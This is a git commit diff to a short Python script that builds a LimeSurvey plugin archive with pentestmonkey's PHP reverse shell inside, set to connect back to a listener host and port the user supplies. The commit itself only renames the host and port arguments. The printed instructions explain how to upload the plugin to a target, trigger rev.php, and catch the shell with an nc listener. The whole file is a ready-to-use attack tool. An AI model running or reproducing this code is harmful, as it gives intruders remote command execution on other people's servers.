4f9ccfa683bd48894c47ccaf4e7702f7c0ed8906
Makider <77248953+N1kkogg@users.noreply.github.com>
2025-02-03 18:10:32 +0100

    Update main.py

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import os
 import shutil
 import argparse
 
-def prep(rhost, rport):
+def prep(lhost, lport):
 	os.makedirs("./dateFunctions", exist_ok=True)
 	with open("./dateFunctions/EMFunctions.php","w") as f:
 		f.write(requests.get("https://raw.githubusercontent.com/LimeSurvey/LimeSurvey/aa8d4d68c2e4bcff9e30abe94bcd55aed35e9b12/application/core/plugins/dateFunctions/EMFunctions.php").text)
@@ -12,16 +12,16 @@ def prep(rhost, rport):
 	with open("./dateFunctions/config.xml", "w") as f:
 		f.write(requests.get("https://raw.githubusercontent.com/LimeSurvey/LimeSurvey/aa8d4d68c2e4bcff9e30abe94bcd55aed35e9b12/application/core/plugins/dateFunctions/config.xml").text)
 	with open("./dateFunctions/rev.php", "w") as f:
-		f.write(requests.get("https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php").text.replace("127.0.0.1",rhost).replace("1234",rport))
+		f.write(requests.get("https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php").text.replace("127.0.0.1",lhost).replace("1234",lport))
 	shutil.make_archive("shell", 'zip', "./dateFunctions/")
 
 def main():
 	parser = argparse.ArgumentParser()
-	parser.add_argument("rhost")
-	parser.add_argument("rport")
+	parser.add_argument("lhost")
+	parser.add_argument("lport")
 	args = parser.parse_args()
-	prep(args.rhost, args.rport)
-	print(f"done!\nthe file is shell.zip, you will have to upload it in your limesurvey plugins.\nWhen you are done, just visit http://LIMESURVEY_TARGET_PATH/upload/plugins/dateFunctions/rev.php, and you will get a shell! Don't forget to open a listener with nc -lnvp {args.rport}")
+	prep(args.lhost, args.lport)
+	print(f"done!\nthe file is shell.zip, you will have to upload it in your limesurvey plugins.\nWhen you are done, just visit http://LIMESURVEY_TARGET_PATH/upload/plugins/dateFunctions/rev.php, and you will get a shell! Don't forget to open a listener with nc -lnvp {args.lport}")
 
 
 if __name__ == '__main__':
